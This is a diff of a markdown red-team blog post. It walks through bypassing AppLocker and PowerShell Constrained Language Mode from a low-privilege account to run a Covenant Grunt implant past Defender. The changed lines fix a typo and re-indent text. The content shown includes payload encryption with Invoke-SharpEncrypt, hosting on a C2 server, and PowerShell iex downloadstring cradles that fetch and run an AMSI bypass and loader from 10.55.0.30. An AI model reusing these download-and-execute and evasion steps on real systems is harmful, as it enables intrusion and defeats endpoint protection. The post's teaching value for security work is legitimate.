@@ -180,7 +180,7 @@ The whole attack is carried out on a low priv account.
 
    Which shows us that the **Users** group has write access to that specific folder. *Perfect - someone fucked up here :)*  
 
-2. Bypass AppLocker and ContrainedLanguage  
+2. Bypass AppLocker and ConstrainedLanguage  
   
    So now that we know how - let´s get our hands dirty.  
 
@@ -192,42 +192,43 @@ The whole attack is carried out on a low priv account.
    ![broken]({{ site.baseurl }}/images/2021-16-01/powershdll_popped.png  "PowerShdll popped")
 
 3. Prepare Invoke-SharpLoader  
+
     Encrypt our default Grunt.exe    
     ```
     . .\Invoke-SharpEncrypt.ps1  
     Invoke-SharpEncrypt -file C:\Tools_manual\nim-1.4.2\examples\Offensive\GruntHTTP.exe -password LuemmelSec -outfile C:\users\Luemmel\Desktop\Grunt_SharpLoader.enc  
     ``` 
 
-![broken]({{ site.baseurl }}/images/2021-16-01/sharpencrypt.png  "sharpencrypt")
+    ![broken]({{ site.baseurl }}/images/2021-16-01/sharpencrypt.png  "sharpencrypt")
 
-Host the encrypted file on our Covenant server under ```Listeners -> listener -> Hosted Files -> + Create```
+    Host the encrypted file on our Covenant server under ```Listeners -> listener -> Hosted Files -> + Create```
 
-Adapt the Invoke-SharpLoader script to have it directly run it with our encrypted payload by adding this to the last line:  
-```
-Invoke-SharpLoader -location http://10.55.0.30/Grunt_SharpLoader.enc -password LuemmelSec -noArgs
-```
+    Adapt the Invoke-SharpLoader script to have it directly run it with our encrypted payload by adding this to the last line:  
+    ```
+    Invoke-SharpLoader -location http://10.55.0.30/Grunt_SharpLoader.enc -password LuemmelSec -noArgs
+    ```
 
-![broken]({{ site.baseurl }}/images/2021-16-01/adapt_isl.png  "sharpencrypt")
+    ![broken]({{ site.baseurl }}/images/2021-16-01/adapt_isl.png  "sharpencrypt")
 
-And host this file as well on our Covenant server under i.e. /Invoke-SharpLoader  
+    And host this file as well on our Covenant server under i.e. /Invoke-SharpLoader  
 
 4. Execute our Powershell load script 
-In the last step we put together a short script that we can call from our PowerShdll which looks like this:  
-```
-iex(new-object net.webclient).downloadstring('http://10.55.0.30/amsibypass');
-iex(new-object net.webclient).downloadstring('http://10.55.0.30/Invoke-SharpLoader');
-```
-Remeber AMSI is still in place here, so we need to bypass it - even inside PowerShdll. Luckily for us, Invoke-Sharploader has a integrated C# and ETW bypass, so we just take care for the normal PowerShell AMSI bypass.  
+    In the last step we put together a short script that we can call from our PowerShdll which looks like this:  
+    ```
+    iex(new-object net.webclient).downloadstring('http://10.55.0.30/amsibypass');
+    iex(new-object net.webclient).downloadstring('http://10.55.0.30/Invoke-SharpLoader');
+    ```
+    Remeber AMSI is still in place here, so we need to bypass it - even inside PowerShdll. Luckily for us, Invoke-Sharploader has a integrated C# and ETW bypass, so we just take care for the normal PowerShell AMSI bypass.  
 
-Upload to our Covenant server under /init.  
+    Upload to our Covenant server under /init.  
 
-*Guns loaded - give em hell*  
+    *Guns loaded - give em hell*  
 
-![broken]({{ site.baseurl }}/images/2021-16-01/guns_fired.png  "guns fired")
-![broken]({{ site.baseurl }}/images/2021-16-01/grunt_incoming.png  "incoming")
-![broken]({{ site.baseurl }}/images/2021-16-01/grunt_executes.png  "executing")
+    ![broken]({{ site.baseurl }}/images/2021-16-01/guns_fired.png  "guns fired")
+    ![broken]({{ site.baseurl }}/images/2021-16-01/grunt_incoming.png  "incoming")
+    ![broken]({{ site.baseurl }}/images/2021-16-01/grunt_executes.png  "executing")
 
-As you can see Defender would really like to upload our sample for further analysis but - nahhhh.
+    As you can see Defender would really like to upload our sample for further analysis but - nahhhh.
 
 ### Conclusion  
 
